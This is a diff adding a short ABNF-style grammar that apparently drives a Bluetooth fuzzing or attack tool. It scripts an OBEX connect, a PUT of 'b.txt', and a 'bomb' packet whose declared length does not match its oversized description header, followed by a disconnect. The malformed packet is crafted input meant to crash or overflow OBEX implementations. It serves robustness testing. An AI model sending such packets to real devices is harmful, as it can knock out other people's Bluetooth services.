@@ -1,0 +1,38 @@
+TRANSACTION = CONNECTION PUT-ACTION BOMB-ACTION DISCONNECTION
+
+CONNECTION = connection-request gen-response
+DISCONNECTION = disconnection-request gen-response
+PUT-ACTION = put-request gen-response 
+BOMB-ACTION = bomb-request gen-response 
+
+bomb-request =  <%BTrfcomm_send%> bomb-req-pkt 
+gen-response = <%BTrfcomm_read%> "+OK" CRLF 
+put-request = <%BTrfcomm_send%> put-req-pkt 
+connection-request = <%BTrfcomm_send%> conn-req-pkt
+disconnection-request = <%BTrfcomm_send%> disconn-req-pkt
+
+;-----------------------Disconnection Request Packet
+disconn-req-pkt = disconn-req-opcode disconn-req-length 
+disconn-req-opcode = %x81 
+disconn-req-length = %x0003
+
+;-----------------------Connection Request Packet
+conn-req-pkt = conn-req-opcode conn-req-length obex-ver conn-req-flags max-accepted-size 
+conn-req-opcode = %x80 
+conn-req-length = %x0007 ;if too long the answer will never come
+obex-ver = %x10
+conn-req-flags = %x00 
+max-accepted-size = %x2000 ; 8K
+
+;------------------------PUT Request Packet
+put-req-pkt = %x02 put-pkt-length put-headers
+put-pkt-length = %x0012
+put-headers = name-header ;length-header; description 
+
+bomb-req-pkt = %x02 %x0006 description
+
+description = %x05  "ab";120%x77
+
+name-header = %x01 name-length filename   ; 15 bytes
+name-length = %x000f ; 3+filename length 
+filename = %x00 "b" %x00 "." %x00 "t" %x00 "x" %x00 "t" %x0000 ; 12 bytes
